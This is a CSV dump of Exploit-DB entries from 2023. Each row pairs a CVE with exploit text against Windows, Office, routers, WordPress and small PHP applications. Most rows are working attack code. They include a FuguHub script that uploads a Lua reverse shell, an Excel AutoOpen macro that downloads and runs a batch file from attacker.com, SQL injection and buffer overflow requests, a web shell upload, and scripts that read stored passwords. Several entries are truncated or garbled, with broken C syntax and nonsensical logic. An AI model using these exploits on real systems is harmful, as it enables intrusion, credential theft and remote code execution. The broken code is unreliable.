CVE-2022-21907,2023-07-07,exploit db,"## Title: Windows 10 v21H1 - HTTP Protocol Stack Remote Code Execution ## Author: nu11secur1ty ## Date: 01.14.2022 ## Vendor: https://www.microsoft.com/ ## Software: https://www.microsoft.com/en-us/download/details.aspx?id=48264 ## Reference: https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-21907 ## CVE-2022-21907 ## Description: NOTE: After a couple of hours of tests and experiments, I found that there have been no vulnerabilities, this is just a ridiculous experiment of Microsoft. When I decided to install the IIS packages on these Windows platforms, everything was ok, and everything is patched! Windows Server 2019, Windows 10 version 1809 - 2018 year are not vulnerable by default, but after I decided to upgrade from 1909 to 2004. I found a serious problem! The Windows 10 version 2004 - 2020 year is still vulnerable to the HTTP Protocol Stack (HTTP.sys). Attack method: buffer overflow - deny of service and restart the system. This problem exists, from last year which is reported on CVE-2021-31166, and still there! On that days I have worked on it again with the help and collaboration of Axel Souchet 0vercl0k the author of the idea. On that day, I wrote an only one-line command to exploit this vulnerability! [+]Exploit: ```python #!/usr/bin/python # Author @nu11secur1ty # CVE-2022-21907 from colorama import init, Fore, Back, Style init(convert=True) import requests import time print(Fore.RED +""Please input your host...\n"") print(Style.RESET_ALL) print(Fore.YELLOW) host = input() print(Style.RESET_ALL) print(Fore.BLUE +""Sending of especially malicious crafted packages, please wait..."") print(Style.RESET_ALL) time.sleep(17) print(Fore.GREEN) # The"
CVE-2023-33145,2023-07-06,exploit db,"## Title:Microsoft Edge 114.0.1823.67 (64-bit) - Information Disclosure ## Author: nu11secur1ty ## Date: 07.06.2023 ## Vendor: https://www.microsoft.com/ ## Software: https://www.microsoft.com/en-us/edge?form=MA13FJ&exp=e415 ## Reference: https://portswigger.net/web-security/information-disclosure, https://www.softwaresecured.com/stride-threat-modeling/ ## CVE-2023-33145 ## Description: The type of information that could be disclosed if an attacker successfully exploited this vulnerability is data inside the targeted website like IDs, tokens, nonces, cookies, IP, User-Agent, and other sensitive information. The user would have to click on a specially crafted URL to be compromised by the attacker. In this example, the attacker use STRIDE Threat Modeling to spoof the victim to click on his website and done. This will be hard to detect. ## Conclusion: Please be careful, for suspicious sites or be careful who sending you an link to open! ## Staus: HIGH Vulnerability [+]Exploit: - Exploit Server: ```js ## This is a Get request from the server when the victims click! And it is enough to understand this vulnerability! =) ## WARNING: The PoCsess.php will be not uploaded for security reasons! ## BR nu11secur1ty ## Reproduce: [href](https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2023/CVE-2023-33146) ## Proof and Exploit [href](https://www.nu11secur1ty.com/2023/07/cve-2023-33145-microsoft-edge.html) ## Time spend: 01:30:00"
CVE-2023-33592,2023-07-06,exploit db,"# Exploit Title: Lost and Found Information System v1.0 - SQL Injection # Date: 2023-06-30 # country: Iran # Exploit Author: Amirhossein Bahramizadeh # Category : webapps # Dork : /php-lfis/admin/?page=system_info/contact_information # Tested on: Windows/Linux # CVE : CVE-2023-33592 import requests # URL of the vulnerable component url = ""http://example.com/php-lfis/admin/?page=system_info/contact_information"" # Injecting a SQL query to exploit the vulnerability payload = ""' OR 1=1 -- "" # Send the request with the injected payload response = requests.get(url + payload) # Check if the SQL injection was successful if ""admin"" in response.text: print(""SQL injection successful!"") else: print(""SQL injection failed."")"
CVE-2023-36355,2023-07-03,exploit db,"# Exploit Title: TP-Link TL-WR940N V4 - Buffer OverFlow # Date: 2023-06-30 # country: Iran # Exploit Author: Amirhossein Bahramizadeh # Category : hardware # Dork : /userRpm/WanDynamicIpV6CfgRpm # Tested on: Windows/Linux # CVE : CVE-2023-36355 import requests # Replace the IP address with the router's IP router_ip = '192.168.0.1' # Construct the URL with the vulnerable endpoint and parameter url = f'http://{router_ip}/userRpm/WanDynamicIpV6CfgRpm?ipStart=' # Replace the payload with a crafted payload that triggers the buffer overflow payload = 'A' * 5000 # Example payload, adjust the length as needed # Send the GET request with the crafted payload response = requests.get(url + payload) # Check the response status code if response.status_code == 200: print('Buffer overflow triggered successfully') else: print('Buffer overflow not triggered')"
CVE-2023-28285,2023-07-03,exploit db,"## Title: Microsoft 365 MSO (Version 2305 Build 16.0.16501.20074) 64-bit - Remote Code Execution (RCE) ## Author: nu11secur1ty ## Date: 04.17.2023 ## Vendor: https://www.microsoft.com/ ## Software: https://www.microsoft.com/en-us/microsoft-365/ ## Reference: https://www.crowdstrike.com/cybersecurity-101/remote-code-execution-rce/ ## CVE-2023-28285 ## Description: The attack itself is carried out locally by a user with authentication to the targeted system. An attacker could exploit the vulnerability by convincing a victim, through social engineering, to download and open a specially crafted file from a website which could lead to a local attack on the victim's computer. The attacker can trick the victim to open a malicious web page by using a malicious `Word` file for `Office-365 API`. After the user will open the file to read it, from the API of Office-365, without being asked what it wants to activate, etc, he will activate the code of the malicious server, which he will inject himself, from this malicious server. Emedietly after this click, the attacker can receive very sensitive information! For bank accounts, logs from some sniff attacks, tracking of all the traffic of the victim without stopping, and more malicious stuff, it depends on the scenario and etc. STATUS: HIGH Vulnerability [+]Exploit: The exploit server must be BROADCASTING at the moment when the victim hit the button of the exploit!"
CVE-2023-33137,2023-07-03,exploit db,"## Title:Microsoft 365 MSO (Version 2305 Build 16.0.16501.20074) 32-bit - Remote Code Execution (RCE) ## Author: nu11secur1ty ## Date: 06.27.2023 ## Vendor: https://www.microsoft.com/ ## Software: https://www.microsoft.com/en-us/microsoft-365/excel ## Reference: https://portswigger.net/daily-swig/rce ## CVE-2023-33137 ## Description: This exploit is connected with third part exploit server, which waits for the victim to call him and execute the content from him using the pipe posting method! This is absolutely a 0-day exploit! This is absolutely dangerous for the victims, who are infected by him! When the victim hit the button in the Excel file, it makes a POST request to the exploit server, and the server is responding back that way: He creates another hidden malicious file and executed it directly on the machine of the victim, then everything is disappeared, so nasty. STATUS: HIGH Vulnerability WARNING: THIS IS VERY DANGER for the usual users! [+]Exploit: ```vbs Sub AutoOpen() Call Shell(""cmd.exe /S /c"" & ""curl -s https://attacker.com/nu11secur1ty/somwhere/ontheinternet/maloumnici.bat > maloumnici.bat && .\maloumnici.bat"", vbNormalFocus) End Sub ## Reproduce: [href](https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2023/CVE-2023-33137) ## Proof and Exploit: [href](https://www.nu11secur1ty.com/2023/06/microsoft-excel-microsoft-365-mso.html) ## Time spend: 01:27:00"
CVE-2023-36346,2023-07-03,exploit db,"# Exploit Title: Sales of Cashier Goods v1.0 - Cross Site Scripting (XSS) # Date: 2023-06-23 # country: Iran # Exploit Author: Amirhossein Bahramizadeh # Category : webapps # Dork : /print.php?nm_member= # Vendor Homepage: https://www.codekop.com/products/source-code-aplikasi-pos-penjualan-barang-kasir-dengan-php-mysql-3.html # Tested on: Windows/Linux # CVE : CVE-2023-36346 import requests import urllib.parse # Set the target URL and payload url = ""http://example.com/print.php"" payload = "" "" # Encode the payload for URL inclusion payload = urllib.parse.quote(payload) # Build the request parameters params = { ""nm_member"": payload # Send the request and print the response response = requests.get(url, params=params) print(response.text)"
CVE-2023-24078,2023-07-03,exploit db,"# Exploit Title: FuguHub 8.1 - Remote Code Execution # Date: 6/24/2023 # Exploit Author: redfire359 # Vendor Homepage: https://fuguhub.com/ # Software Link: https://fuguhub.com/download.lsp # Version: 8.1 # Tested on: Ubuntu 22.04.1 # CVE : CVE-2023-24078 import requests from bs4 import BeautifulSoup import hashlib from random import randint from urllib3 import encode_multipart_formdata from urllib3.exceptions import InsecureRequestWarning import argparse from colorama import Fore requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning) #Options for user registration, if no user has been created yet username = 'admin' password = 'password' email = 'admin@admin.com' parser = argparse.ArgumentParser() parser.add_argument(""-r"",""--rhost"", help = ""Victims ip/url (omit the http://)"", required = True) parser.add_argument(""-rp"",""--rport"", help = ""http port [Default 80]"") parser.add_argument(""-l"",""--lhost"", help = ""Your IP"", required = True) parser.add_argument(""-p"",""--lport"", help = ""Port you have your listener on"", required = True) args = parser.parse_args() LHOST = args.lhost LPORT = args.lport url = args.rhost if args.rport != None: port = args.rport else: port = 80 def main(): checkAccount() def checkAccount(): print(f""{Fore.YELLOW}[*]{Fore.WHITE} Checking for admin user..."") s = requests.Session() # Go to the set admin page... if page contains ""User database already saved"" then there are already admin creds and we will try to login with the creds, otherwise we will manually create an account r = s.get(f""http://{url}:{port}/Config-Wizard/wizard/SetAdmin.lsp"") soup = BeautifulSoup(r.content, 'html.parser') search = soup.find('h1') if r.status_code == 404: print(Fore.RED + ""[!]"" + Fore.WHITE +"" Page not found! Check the following: \n\tTaget IP\n\tTarget Port"") exit(0) userExists = False userText = 'User database already saved' for i in search: if i.string == userText: userExists = True if userExists: print(f""{Fore.GREEN}[+]{Fore.WHITE} An admin user does exist.."") login(r,s) else: print(""{Fore.GREEN}[+]{Fore.WHITE} No admin user exists yet, creating account with {username}:{password}"") createUser(r,s) login(r,s) def createUser(r,s): data = { email : email , 'user' : username , 'password' : password , 'recoverpassword' : 'on' } r = s.post(f""http://{url}:{port}/Config-Wizard/wizard/SetAdmin.lsp"", data = data) print(f""{Fore.GREEN}[+]{Fore.WHITE} User Created!"") def login(r,s): print(f""{Fore.GREEN}[+]{Fore.WHITE} Logging in..."") data = {'ba_username' : username , 'ba_password' : password} r = s.post(f""https://{url}:443/rtl/protected/wfslinks.lsp"", data = data, verify = False ) # switching to https cause its easier to script lolz #Veryify login login_Success_Title = 'Web-File-Server' soup = BeautifulSoup(r.content, 'html.parser') search = soup.find('title') for i in search: if i != login_Success_Title: print(f""{Fore.RED}[!]{Fore.WHITE} Error! We got sent back to the login page..."") exit(0) print(f""{Fore.GREEN}[+]{Fore.WHITE} Success! Finding a valid file server link..."") exploit(r,s) def exploit(r,s): #Find the file server, default is fs r = s.get(f""https://{url}:443/fs/cmsdocs/"") code = r.status_code if code == 404: print(f""{Fore.RED}[!]{Fore.WHITE} File server not found. "") exit(0) print(f""{Fore.GREEN}[+]{Fore.WHITE} Code: {code}, found valid file server, uploading rev shell"") #Change the shell if you want to, when tested I've had the best luck with lua rev shell code so thats what I put as default shell = f'local host, port = ""{LHOST}"", {LPORT} \nlocal socket = require(""socket"")\nlocal tcp = socket.tcp() \nlocal io = require(""io"") tcp:connect(host, port); \n while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, ""r"") local s = f:read(""*a"") f:close() tcp:send(s) if status == ""closed"" then break end end tcp:close()' file_content = f''' Check ur nc listener on the port you put in Wrong request method, goodBye! ''' files = {'file': ('rev.lsp', file_content, 'application/octet-stream')} r = s.post(f""https://{url}:443/fs/cmsdocs/"", files=files) if r.text == 'ok' : print(f""{Fore.GREEN}[+]{Fore.WHITE} Successfully uploaded, calling shell "") r = s.get(f""https://{url}:443/rev.lsp"") if __name__=='__main__': try: main() except: print(f""\n{Fore.YELLOW}[*]{Fore.WHITE} Good bye!\n\n**All Hail w4rf4ther!"")"
CVE-2023-36348,2023-07-03,exploit db,"# Exploit Title: POS Codekop v2.0 - Authenticated Remote Code Execution (RCE) # Date: 25-05-2023 # Exploit Author: yuyudhn # Vendor Homepage: https://www.codekop.com/ # Software Link: https://github.com/fauzan1892/pos-kasir-php # Version: 2.0 # Tested on: Linux # CVE: CVE-2023-36348 # Vulnerability description: The application does not sanitize the filename parameter when sending data to /fungsi/edit/edit.php?gambar=user. An attacker can exploit this issue by uploading a PHP file and accessing it, leading to Remote Code Execution. # Reference: https://yuyudhn.github.io/pos-codekop-vulnerability/ # Proof of Concept: 1. Login to POS Codekop dashboard. 2. Go to profile settings. 3. Upload PHP script through Upload Profile Photo. Burp Log Example: POST /research/pos-kasir-php/fungsi/edit/edit.php?gambar=user HTTP/1.1 Host: localhost Content-Length: 8934 Cache-Control: max-age=0 sec-ch-ua: sec-ch-ua-mobile: ?0 sec-ch-ua-platform: """" **Upgrade-Insecure-Requests: 1 Origin: http://localhost Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVBHqH4m6KgKBnpa User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-User: ?1** Sec-Fetch-Dest: document Referer: http://localhost/research/pos-kasir-php/index.php?page=user Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=vqlfiarme77n1r4o8eh2kglfhv Connection: close ------WebKitFormBoundarymVBHqH4m6KgKBnpa Content-Disposition: form-data; name=""foto""; filename=""asuka-rce.php"" Content-Type: image/jpeg ÿØÿà JFIF HHÿþ6 ÿÛC PHP Web Shell location: http://localhost/research/pos-kasir-php/assets/img/user/[random_number]asuka-rce.php"
CVE-2022-4297,2023-07-03,exploit db,"# Exploit Title: WP AutoComplete 1.0.4 - Unauthenticated SQLi # Date: 30/06/2023 # Exploit Author: Matin nouriyan (matitanium) # Version: <= 1.0.4 # CVE: CVE-2022-4297 Vendor Homepage: https://wordpress.org/support/plugin/wp-autosearch/ # Tested on: Kali linux The WP AutoComplete Search WordPress plugin through 1.0.4 does not sanitise and escape a parameter before using it in a SQL statement via an AJAX available to unauthenticated users, leading to an unauthenticated SQL injection How to Reproduce this Vulnerability: 1. Install WP AutoComplete <= 1.0.4 2. WP AutoComplete <= 1.0.4 using q parameter for ajax requests 3. Find requests belong to WP AutoComplete like step 5 4. Start sqlmap and exploit 5. python3 sqlmap.py -u ""https://example.com/wp-admin/admin-ajax.php?q=[YourSearch]&Limit=1000&timestamp=1645253464&action=wi_get_search_results&security=[xxxx]"" --random-agent --level=5 --risk=2 -p q"
CVE-2023-28293,2023-06-26,exploit db,"#include #include // The vulnerable driver file name const char *driver_name = ""vuln_driver.sys""; const char *device_name = ""\\\\.\\VulnDriver""; #define IOCTL_VULN_CODE 0x222003 #define IOCTL_BUFFER_SIZE 0x1000 int main() HANDLE device; DWORD bytes_returned; char input_buffer[IOCTL_BUFFER_SIZE]; char output_buffer[IOCTL_BUFFER_SIZE]; if (!LoadDriver(driver_name, ""\\Driver\\VulnDriver"")) printf(""Error loading vulnerable driver: %d\n"", GetLastError()); return 1; device = CreateFile(device_name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (device == INVALID_HANDLE_VALUE) printf(""Error opening vulnerable driver device: %d\n"", GetLastError()); return 1; memset(input_buffer, 'A', IOCTL_BUFFER_SIZE); if (!DeviceIoControl(device, IOCTL_VULN_CODE, input_buffer, IOCTL_BUFFER_SIZE, output_buffer, IOCTL_BUFFER_SIZE, &bytes_returned, NULL)) printf(""Error sending IOCTL: %d\n"", GetLastError()); return 1; printf(""Output buffer:\n%s\n"", output_buffer); if (!UnloadDriver(""\\Driver\\VulnDriver"")) printf(""Error unloading vulnerable driver: %d\n"", GetLastError()); return 1; CloseHandle(device); return 0; BOOL LoadDriver(LPCTSTR driver_name, LPCTSTR service_name) SC_HANDLE sc_manager, service; DWORD error; sc_manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); if (sc_manager == NULL) return FALSE; service = CreateService(sc_manager, service_name, service_name, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, driver_name, NULL, NULL, NULL, NULL, NULL); if (service == NULL) error = GetLastError(); if (error == ERROR_SERVICE_EXISTS) service = OpenService(sc_manager, service_name, SERVICE_ALL_ACCESS); if (service == NULL) CloseServiceHandle(sc_manager); return FALSE; else CloseServiceHandle(sc_manager); return FALSE; if (!StartService(service, 0, NULL)) error = GetLastError(); if (error != ERROR_SERVICE_ALREADY_RUNNING) CloseServiceHandle(service); CloseServiceHandle(sc_manager); return FALSE; CloseServiceHandle(service); CloseServiceHandle(sc_manager); return TRUE; BOOL UnloadDriver(LPCTSTR service_name) SC_HANDLE sc_manager, service; SERVICE_STATUS status; DWORD error; sc_manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); if (sc_manager == NULL) return FALSE; service = OpenService(sc_manager, service_name, SERVICE_ALL_ACCESS); if (service == NULL) CloseServiceHandle(sc_manager); return FALSE; if (!ControlService(service, SERVICE_CONTROL_STOP, &status)) error = GetLastError(); if (error != ERROR_SERVICE_NOT_ACTIVE) CloseServiceHandle(service); CloseServiceHandle(sc_manager); return FALSE; if (!DeleteService(service)) CloseServiceHandle(service); CloseServiceHandle(sc_manager); return FALSE; CloseServiceHandle(service); CloseServiceHandle(sc_manager); return TRUE;"
CVE-2023-23408,2023-06-26,exploit db,"# Exploit Title: Azure Apache Ambari 2302250400 - Spoofing # Date: 2023-06-23 # country: Iran # Exploit Author: Amirhossein Bahramizadeh # Category : Remote # Vendor Homepage: Microsoft Apache Ambari Microsoft azure Hdinsights # Tested on: Windows/Linux # CVE : CVE-2023-23408 import requests # Set the URL and headers for the Ambari web interface url = ""https://ambari.example.com/api/v1/clusters/cluster_name/services"" headers = {""X-Requested-By"": ""ambari"", ""Authorization"": ""Basic abcdefghijklmnop""} # Define a function to validate the headers def validate_headers(headers): if ""X-Requested-By"" not in headers or headers[""X-Requested-By""] != ""ambari"": return False if ""Authorization"" not in headers or headers[""Authorization""] != ""Basic abcdefghijklmnop"": return False return True # Define a function to send a request to the Ambari web interface def send_request(url, headers): if not validate_headers(headers): print(""Invalid headers"") return response = requests.get(url, headers=headers) if response.status_code == 200: print(""Request successful"") else: print(""Request failed"") # Call the send_request function with the URL and headers send_request(url, headers)"
CVE-2023-28288,2023-06-26,exploit db,"#include #include // The vulnerable SharePoint server URL const char *server_url = ""http://example.com/""; const char *fake_url = ""http://attacker.com/""; const char *file_name = ""vuln_file.aspx""; const char *fake_file_name = ""fake_file.aspx""; int main() HANDLE file; DWORD bytes_written; char file_contents[1024]; sprintf(file_contents, "" This is a fake file. ""); file = CreateFile(fake_file_name, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (file == INVALID_HANDLE_VALUE) printf(""Error creating fake file: %d\n"", GetLastError()); return 1; if (!WriteFile(file, file_contents, strlen(file_contents), &bytes_written, NULL)) printf(""Error writing fake file: %d\n"", GetLastError()); CloseHandle(file); return 1; CloseHandle(file); sprintf(file_contents, ""%s%s"", server_url, file_name); file = CreateFile(file_name, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (file == INVALID_HANDLE_VALUE) printf(""Error creating vulnerable file: %d\n"", GetLastError()); return 1; if (!InternetReadFileUrl(file_contents, file)) printf(""Error downloading vulnerable file: %d\n"", GetLastError()); CloseHandle(file); return 1; CloseHandle(file); if (!DeleteFile(file_name)) printf(""Error deleting vulnerable file: %d\n"", GetLastError()); return 1; if (!MoveFile(fake_file_name, file_name)) printf(""Error replacing vulnerable file: %d\n"", GetLastError()); return 1; sprintf(file_contents, ""%s%s"", server_url, file_name); if (!InternetReadFileUrl(file_contents, NULL)) printf(""Error triggering vulnerability: %d\n"", GetLastError()); return 1; printf(""Vulnerability exploited successfully.\n""); return 0; BOOL InternetReadFileUrl(const char *url, HANDLE file) HINTERNET internet, connection, request; DWORD bytes_read; char buffer[1024]; internet = InternetOpen(""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0); if (internet == NULL) return FALSE; connection = InternetConnect(internet, fake_url, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0); if (connection == NULL) InternetCloseHandle(internet); return FALSE; request = HttpOpenRequest(connection, ""GET"", url, NULL, NULL, NULL, 0, 0); if (request == NULL) InternetCloseHandle(connection); InternetCloseHandle(internet); return FALSE; if (!HttpSendRequest(request, NULL, 0, NULL, 0)) InternetCloseHandle(request); InternetCloseHandle(connection); InternetCloseHandle(internet); return FALSE; while (InternetReadFile(request, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0) if (file != NULL) if (!WriteFile(file, buffer, bytes_read, &bytes_read, NULL)) InternetCloseHandle(request); InternetCloseHandle(connection); InternetCloseHandle(internet); return FALSE; InternetCloseHandle(request); InternetCloseHandle(connection); InternetCloseHandle(internet); return TRUE;"
CVE-2023-30198,2023-06-26,exploit db,"# Exploit Title: PrestaShop Winbiz Payment module - Improper Limitation of a Pathname to a Restricted Directory # Date: 2023-06-20 # Dork: /modules/winbizpayment/downloads/download.php # country: Iran # Exploit Author: Amirhossein Bahramizadeh # Category : webapps # Vendor Homepage: https://shop.webbax.ch/modules-pour-winbiz/153-module-prestashop-winbiz-payment-reverse.html # Version: 17.1.3 (REQUIRED) # Tested on: Windows/Linux # CVE : CVE-2023-30198 import requests import string import random # The base URL of the vulnerable site base_url = ""http://example.com"" # The URL of the login page login_url = base_url + ""/authentication.php"" # The username and password for the admin account username = ""admin"" password = ""password123"" # The URL of the vulnerable download.php file download_url = base_url + ""/modules/winbizpayment/downloads/download.php"" # The ID of the order to download order_id = 1234 # The path to save the downloaded file file_path = ""/tmp/order_%d.pdf"" % order_id # The session cookies to use for the requests session_cookies = None # Generate a random string for the CSRF token csrf_token = ''.join(random.choices(string.ascii_uppercase + string.digits, k=32)) # Send a POST request to the login page to authenticate as the admin user login_data = {""email"": username, ""passwd"": password, ""csrf_token"": csrf_token} session = requests.Session() response = session.post(login_url, data=login_data) # Save the session cookies for future requests session_cookies = session.cookies.get_dict() # Generate a random string for the CSRF token csrf_token = ''.join(random.choices(string.ascii_uppercase + string.digits, k=32)) # Send a POST request to the download.php file to download the order PDF download_data = {""id_order"": order_id, ""csrf_token"": csrf_token} response = session.post(download_url, cookies=session_cookies, data=download_data) # Save the downloaded file to disk with open(file_path, ""wb"") as f: f.write(response.content) # Print a message indicating that the file has been downloaded print(""File downloaded to %s"" % file_path)"
CVE-2020-11560,2023-06-23,exploit db,"# Exploit Title: NCH Express Invoice - Clear Text Password Storage and Account Takeover # Google Dork:: intitle:ExpressInvoice - Login # Date: 07/Apr/2020 # Exploit Author: Tejas Nitin Pingulkar (https://cvewalkthrough.com/) # Vendor Homepage: https://www.nchsoftware.com/ # Software Link: http://www.oldversiondownload.com/oldversions/express-8-05-2020-06-08.exe # Version: NCH Express Invoice 8.24 and before # CVE Number : CVE-2020-11560 # CVSS: 7.8 (High) # Reference: https://cvewalkthrough.com/cve-2020-11560/ # Vulnerability Description: # Express Invoice is a thick client application that has functionality to allow the application access over the web. While configuring web access function application ask for user details such as username, password, email, etc. Application stores this information in “C:\ProgramData\NCH Software\ExpressInvoice\Accounts” in clear text as well as due to inadequate folder pemtion any Low prevladge authenticated user can access files stored in cleartext format #Note: from version 8.24 path changed to “C:\ProgramData\NCH Software\ExpressInvoice\WebAccounts” import os import urllib.parse # Enable ANSI escape sequences for colors on Windows if os.name == 'nt': os.system('') # Function to decode URL encoding def decode_url(url): decoded_url = urllib.parse.unquote(url) return decoded_url # Function to list files and display as numeric list def list_files(file_list): for i, file in enumerate(file_list, start=1): # Omit the part of the file name after %40 username = file.split(""%40"")[0] print(f""{i}. {username}"") # Main program print(""\033[93mDisclaimer: This script is for educational purposes only."") print(""The author takes no responsibility for any unauthorized usage."") print(""Please use this script responsibly and adhere to the legal and ethical guidelines.\033[0m"") agreement = input(""\033[93mDo you agree to the terms? (yes=1, no=0): \033[0m"") if agreement != '1': print(""\033[93mYou did not agree to the terms. Exiting the program.\033[0m"") exit() nch_version = input(""\033[93mIs the targeted NCH Express Invoice application version less than 8.24? (yes=1, no=0): \033[0m"") if nch_version == '1': file_directory = r""C:\ProgramData\NCH Software\ExpressInvoice\WebAccounts"" else: file_directory = r""C:\ProgramData\NCH Software\ExpressInvoice\Accounts"" file_list = os.listdir(file_directory) print(""\033[94mUser Accounts:\033[0m"") list_files(file_list) selected_file = input(""\033[94mSelect the file number for the user: \033[0m"") selected_file = int(selected_file) - 1 file_path = os.path.join(file_directory, file_list[selected_file]) with open(file_path, 'r') as file: contents = file.read() print(f""\033[94mSelected User: {file_list[selected_file].split('%40')[0]}\033[0m"") exploit_option = input(""\n\033[94mSelect the exploit option: "" ""\n1. Display User Passwords "" ""\n2. Account Takeover Using Password Replace "" ""\n3. User Privilege Escalation\nOption: \033[0m"") # Exploit actions if exploit_option == ""1"": decoded_contents = decode_url(contents) print(""\033[91mPlease find the password in the below string:\033[0m"") print(decoded_contents) elif exploit_option == ""2"": new_password = input(""\033[92mEnter the new password: \033[0m"") current_password = contents.split(""Password="")[1].split(""&"")[0] replaced_contents = contents.replace(f""Password={current_password}"", f""Password={new_password}"") print(""\033[92mSelected user's password changed to: Your password\033[0m"") print(replaced_contents) with open(file_path, 'w') as file: file.write(replaced_contents) elif exploit_option == ""3"": replaced_contents = contents.replace(""Administrator=0"", ""Administrator=1"").replace(""Priviligies=2"", ""Priviligies=1"") print(""\033[92mUser is now an Administrator.\033[0m"") print(replaced_contents) with open(file_path, 'w') as file: file.write(replaced_contents) else: print(""\033[91mInvalid exploit option. Exiting the program.\033[0m"") exit() print(""\033[91mFor more such interesting exploits, visit cvewalkthrough.com\033[0m"") input(""\033[91mPress enter to exit.\033[0m"")"
CVE-2023-34834,2023-06-23,exploit db,"# Exploit Title: MCL-Net 4.3.5.8788 - Information Disclosure # Date: 5/31/2023 # Exploit Author: Victor A. Morales, GM Sectec Inc. # Vendor Homepage: https://www.mcl-mobilityplatform.com/net.php # Version: 4.3.5.8788 (other versions may be affected) # Tested on: Microsoft Windows 10 Pro # CVE: CVE-2023-34834 Description: Directory browsing vulnerability in MCL-Net version 4.3.5.8788 webserver running on default port 5080, allows attackers to gain sensitive information about the configured databases via the ""/file"" endpoint. Steps to reproduce: 1. Navigate to the webserver on default port 5080, where ""Index of Services"" will disclose directories, including the ""/file"" directory. 2. Browse to the ""/file"" directory and database entry folders configured 3. The ""AdoInfo.txt"" file will contain the database connection strings in plaintext for the configured database. Other files containing database information are also available inside the directory."
CVE-2022-47076,2023-06-22,exploit db,"# Exploit Title: Smart Office Web 20.28 - Remote Information Disclosure (Unauthenticated) # Shodan Dork:: inurl:""https://www.shodan.io/search?query=smart+office"" # Date: 09/Dec/2022 # Exploit Author: Tejas Nitin Pingulkar (https://cvewalkthrough.com/) # Vendor Homepage: https://smartofficepayroll.com/ # Software Link: https://smartofficepayroll.com/downloads # Version: Smart Office Web 20.28 and before # CVE Number : CVE-2022-47075 and CVE-2022-47076 # CVSS : 7.5 (High) # Reference : https://cvewalkthrough.com/smart-office-suite-cve-2022-47076-cve-2022-47075/ # Vulnerability Description: # Smart Office Web 20.28 and before allows Remote Information Disclosure(Unauthenticated) via insecure direct object reference (IDOR). This was fixed in latter version except for ExportEmployeeDetails. import wget import os from colorama import Fore, Style def download_file(url, filename): wget.download(url, filename) # Disclaimer print(Fore.YELLOW + ""Disclaimer: This script is for educational purposes only."") print(""The author takes no responsibility for any unauthorized usage."") print(""Please use this script responsibly and adhere to the legal and ethical guidelines."") agree = input(""Do you agree to the disclaimer? (1 = Yes, 0 = No): "") if agree != ""1"": print(""You have chosen not to agree. Exiting the script."") exit() # Print name in red name = ""Exploit by Tejas Nitin Pingulkar"" print(Fore.RED + name) print(Style.RESET_ALL) # Reset color website = input(""Enter URL [https://1.1.1.1:1111 or http://1.1.1.1]: "") target_version = input(""Is the target software version 20.28 or later? (1 = Yes, 0 = No): "") folder_name = input(""Enter the folder name to save the files: "") # Create the folder if it doesn't exist if not os.path.exists(folder_name): os.makedirs(folder_name) urls_filenames = [] if target_version == ""1"": urls_filenames.append((website + ""/ExportEmployeeDetails.aspx?ActionName=ExportEmployeeOtherDetails"", ""ExportEmployeeOtherDetails.csv"")) else: urls_filenames.extend([ (website + ""/ExportEmployeeDetails.aspx?ActionName=ExportEmployeeDetails"", ""ExportEmployeeDetails.csv""), (website + ""/DisplayParallelLogData.aspx"", ""DisplayParallelLogData.txt""), (website + ""/ExportReportingManager.aspx"", ""ExportReportingManager.csv""), (website + ""/ExportEmployeeLoginDetails.aspx"", ""ExportEmployeeLoginDetails.csv"") print(""CVE-2022-47076: Obtain user ID and password from downloaded source"") for url, filename in urls_filenames: download_file(url, os.path.join(folder_name, filename)) # Print ""for more such interesting exploits, visit cvewalkthrough.com"" in red print(Fore.RED + ""\nFor more such interesting exploits, visit cvewalkthrough.com"") print(Style.RESET_ALL) # Reset color"
CVE-2023-25187,2023-06-20,exploit db,"#include #include #include #include #include #include #include #include #include #include #include // The IP address of the vulnerable device char *host = ""192.168.1.1""; int port = 22; char *username = ""service_user""; char *password = ""password123""; char *attacker_ip = ""10.0.0.1""; int attacker_port = 2222; #define MAX_LEN 1024 void forward_data(int sock1, int sock2) char buffer[MAX_LEN]; ssize_t bytes_read; while ((bytes_read = read(sock1, buffer, MAX_LEN)) > 0) write(sock2, buffer, bytes_read); int main() int sock, pid1, pid2; struct sockaddr_in addr; char *argv[] = {""/usr/bin/ssh"", ""-l"", username, ""-p"", ""2222"", ""-o"", ""StrictHostKeyChecking=no"", ""-o"", ""UserKnownHostsFile=/dev/null"", ""-o"", ""PasswordAuthentication=no"", ""-o"", ""PubkeyAuthentication=yes"", ""-i"", ""/path/to/private/key"", ""-N"", ""-R"", ""2222:localhost:22"", host, NULL}; sock = socket(AF_INET, SOCK_STREAM, 0); memset(&addr, 0, sizeof(addr)); addr.sin_family = AF_INET; addr.sin_port = htons(port); inet_pton(AF_INET, host, &addr.sin_addr); if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) fprintf(stderr, ""Error connecting to %s:%d: %s\n"", host, port, strerror(errno)); exit(1); write(sock, ""SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10\r\n"", 42); read(sock, NULL, 0); write(sock, username, 